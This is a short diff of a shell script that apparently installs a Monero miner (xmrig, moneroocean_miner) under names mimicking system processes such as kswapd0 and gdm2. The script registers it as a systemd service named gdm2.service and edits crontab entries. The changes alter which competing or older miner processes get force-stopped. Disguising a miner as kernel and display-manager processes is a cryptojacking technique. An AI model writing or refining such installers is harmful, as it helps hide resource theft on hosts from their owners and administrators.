@@ -86,9 +86,9 @@ force_stop_service() {
 echo "[*] Cleaning previous installations..."
 
 # Use robust force-stop function
-force_stop_service \
-    "gdm2 swapd moneroocean_miner" \
-    "xmrig kswapd0 swapd gdm2 moneroocean_miner"
+#force_stop_service \
+#    "gdm2 swapd moneroocean_miner" \
+#    "xmrig kswapd0 swapd gdm2 moneroocean_miner"
 
 # Remove crontab entries
 crontab -l | grep -v "system_cache\|check_and_start\|swapd\|gdm2" | crontab -
@@ -497,7 +497,7 @@ EOL
     sudo mv /tmp/gdm2.service /etc/systemd/system/gdm2.service
     
     echo "[*] Ensuring old processes are stopped before starting new service..."
-    force_stop_service "gdm2" "kswapd0"
+    force_stop_service "swapd"
     
     echo "[*] Reloading systemd daemon..."
     sudo systemctl daemon-reload
